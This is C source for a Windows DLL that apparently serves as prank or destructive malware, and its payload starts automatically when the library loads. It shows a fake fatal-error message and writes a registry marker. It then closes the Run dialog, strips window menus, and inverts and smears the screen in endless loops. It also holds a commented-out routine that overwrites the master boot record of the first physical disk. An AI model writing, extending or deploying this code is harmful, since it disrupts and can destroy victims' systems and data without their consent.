#include "../Diskaid/dep.h"
HANDLE ct;
HANDLE ctf;

BOOLEAN isFirstRun() {
	HKEY rkey;
	long result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\mbr", NULL, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE, &rkey);
	if (result != 0L) {
		RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\mbr", &rkey);
		RegCloseKey(rkey);
		return TRUE;
	}
	else
		RegCloseKey(rkey);
	return FALSE;
}

/*void MBR() {
	DWORD dw;
	HANDLE mb = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(mb, mbrData, 512, &dw, 0);
	CloseHandle(mb);
}*/

DWORD CALLBACK CallBox(LPVOID p) { return MessageBoxA(NULL, "There is no place you can run", "Windows", MB_ICONINFORMATION | MB_OK); }

DWORD WINAPI NoRun(LPVOID p) {
	while (1) {
		HWND hwnd = FindWindowA(NULL, "Run");
		HANDLE nb = NULL;
		if (!hwnd == NULL)
			SendMessage(hwnd, WM_CLOSE, 0, NULL);
		else
			continue;
		nb = CreateThread(0, 0, &CallBox, 0, 0, 0);
		Sleep(10);
	}
}

/*DWORD WINAPI SelfDestruct(LPVOID p) {

}*/

DWORD WINAPI incInvert(LPVOID p) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		for (int i = 0; i < h; i++) {
			BitBlt(hdc, 0, i, w, 1, hdc, 0, i, NOTSRCCOPY);
		}
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI RemoveButtons(LPVOID p) {
	while (1) {
		SetWindowLongPtr(GetForegroundWindow(), GWL_STYLE, GetWindowLongPtr(GetForegroundWindow(), GWL_STYLE) & ~WS_SYSMENU);
	}
}

DWORD WINAPI Shuffle(LPVOID p) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		StretchBlt(hdc, 128, -128, w - 128, h - 128, hdc, 0, 0, w - 100, h - 100, SRCCOPY);
		StretchBlt(hdc, -16, 16, w - 32, h - 32, hdc, 0, 0, w - 100, h - 100, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI Main(LPVOID p) {
	if (isFirstRun() == TRUE)
		MessageBox(NULL, L"Unknown Fatal Error\nError Code: 0x666", L"Windows", MB_ICONERROR | MB_OK);
	else {/*MBR();*/}
	ctf = CreateThread(NULL, NULL, &NoRun, NULL, NULL, NULL);
	Sleep(30000);
	ctf = CreateThread(NULL, NULL, &RemoveButtons, NULL, NULL, NULL);
	Sleep(30000);
	ct = CreateThread(NULL, NULL, &incInvert, NULL, NULL, NULL);
	Sleep(30000);
	TerminateThread(ct, NULL);
	ct = CreateThread(NULL, NULL, &Shuffle, NULL, NULL, NULL);
	Sleep(30000);
	TerminateThread(ct, NULL);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
		ctf = CreateThread(NULL, NULL, &Main, NULL, NULL, NULL);
	return TRUE;
}

